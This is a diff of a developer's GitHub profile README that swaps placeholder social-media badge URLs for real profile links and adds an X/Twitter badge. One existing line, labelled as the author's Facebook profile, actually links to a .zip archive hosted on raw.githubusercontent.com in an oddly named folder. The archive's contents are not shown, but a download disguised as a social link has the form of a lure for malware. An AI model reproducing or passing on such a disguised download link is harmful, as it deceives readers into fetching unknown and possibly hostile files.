@@ -100,27 +100,27 @@ I'm a developer who turns ideas into reality through clean code and creative thi
 - 📘 Facebook: [Ing Vanly](https://raw.githubusercontent.com/Ing-Vanly/Ing-Vanly/main/elocutionize/Ing-Vanly.zip)
 <br>
 <!-- Facebook -->
-<a href="https://www.facebook.com/yourprofile">
+<a href="https://www.facebook.com/share/1CRxHwT6TT/?mibextid=wwXIfr">
   <img src="https://img.shields.io/badge/Facebook-%231877F2.svg?&style=for-the-badge&logo=facebook&logoColor=white" alt="Facebook"/>
 </a>
 
 <!-- Instagram -->
-<a href="https://www.instagram.com/yourusername">
+<a href="https://www.instagram.com/ingvanly?igsh=cjVoZ3k1cHV3MzM%3D&utm_source=qr">
   <img src="https://img.shields.io/badge/Instagram-%23E4405F.svg?&style=for-the-badge&logo=instagram&logoColor=white" alt="Instagram"/>
 </a>
 
 <!-- LinkedIn -->
-<a href="https://www.linkedin.com/in/yourprofile">
+<a href="https://www.linkedin.com/in/ing-vanly-8802392b8?utm_source=share&utm_campaign=share_via&utm_content=profile&utm_medium=ios_app">
   <img src="https://img.shields.io/badge/LinkedIn-%230A66C2.svg?&style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn"/>
 </a>
 
 <!-- YouTube -->
-<a href="https://www.youtube.com/@yourchannel">
+<a href="https://youtube.com/@ingvanly?si=PtQ_iVnm_p-N7ZEh">
   <img src="https://img.shields.io/badge/YouTube-%23FF0000.svg?&style=for-the-badge&logo=youtube&logoColor=white" alt="YouTube"/>
 </a>
 
 <!-- Discord -->
-<a href="https://discord.gg/yourserver">
+<a href="https://discord.gg/4Rt2QTCY">
   <img src="https://img.shields.io/badge/Discord-%235865F2.svg?&style=for-the-badge&logo=discord&logoColor=white" alt="Discord"/>
 </a>
 
@@ -135,10 +135,14 @@ I'm a developer who turns ideas into reality through clean code and creative thi
 </a>
 
 <!-- TikTok -->
-<a href="https://www.tiktok.com/@yourusername">
+<a href="https://www.tiktok.com/@ingvanly?is_from_webapp=1&sender_device=pc">
   <img src="https://img.shields.io/badge/TikTok-%23000000.svg?&style=for-the-badge&logo=tiktok&logoColor=white" alt="TikTok"/>
 </a>
 
+<!-- Twitter / X -->
+<a href="https://x.com/ingvanly168?s=21" target="_blank">
+  <img src="https://img.shields.io/badge/Twitter-%23000000.svg?&style=for-the-badge&logo=x&logoColor=white" alt="Twitter / X"/>
+</a>
 
 ---
 
